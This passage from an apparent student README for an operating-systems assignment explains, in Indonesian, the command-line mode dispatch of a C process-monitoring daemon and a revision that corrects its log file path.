    } else if (strcmp(mode, "daemon") == 0) {
        run_as_daemon(username);
    } else if (strcmp(mode, "stop") == 0) {
        stop_daemon(username);
    } else if (strcmp(mode, "fail") == 0) {
        fail(username);
    } else if (strcmp(mode, "revert") == 0) {
        revert(username);
    } else {
        fprintf(stderr, "Mode tidak dikenali: %s\n", mode);
        return 1;
    }

    return 0;
}
```
- Fungsi ini memproses argumen dari command line untuk menentukan mode operasi program.
- Memastikan jumlah argumen tepat 3 (program + mode + username), jika tidak, tampilkan panduan penggunaan.
- argv[1] menentukan mode: bisa list, daemon, stop, fail, atau revert.
- argv[2] adalah nama user yang prosesnya akan dimonitor.
- Setiap mode memanggil fungsi berbeda:
    - list → tampilkan proses milik user tersebut.
    - daemon → jalankan monitoring daemon di background.
    - stop → hentikan daemon monitoring.
    - fail → jalankan mode pemusnah proses non-whitelist.
    - revert → hentikan mode fail (hanya bisa oleh root).
- Jika mode tidak dikenali, tampilkan pesan error dan keluar dengan status 1.
  
---

**Revisi soal_3

---

**Revisi soal_4**
=
Seharusnya ketika mode daemon di panggil mode tersebut akan membuat sebuah file log yang berisi proses yang akan terus diupdate selang beberapa detik, tetapi file log tidak muncul. Sebenarnya file log disini bukan tidak muncul atau gagal dibuat tapi berada di direktori yang salah. Seharusnya file log muncul di direktori soal_4 tapi malah muncul di direktori SISOP_2 karena path nya salah

sebelum
```c
#define LOG_PATH "/home/seribu_man/SISOP_2/debugmon.log"
```
![alt text](https://github.com/DimasSatya446/GambarSISOP2/blob/main/Screenshot%202025-04-17%20230757.png?raw=true)

sesudah
```c
#define LOG_PATH "/home/seribu_man/SISOP_2/soal_4/debugmon.log"
```
![alt text](https://github.com/DimasSatya446/GambarSISOP2/blob/main/Screenshot%202025-04-17%20230318.png?raw=true)
![alt text](https://github.com/DimasSatya446/GambarSISOP2/blob/main/Screenshot%202025-04-17%20230708.png?raw=true)

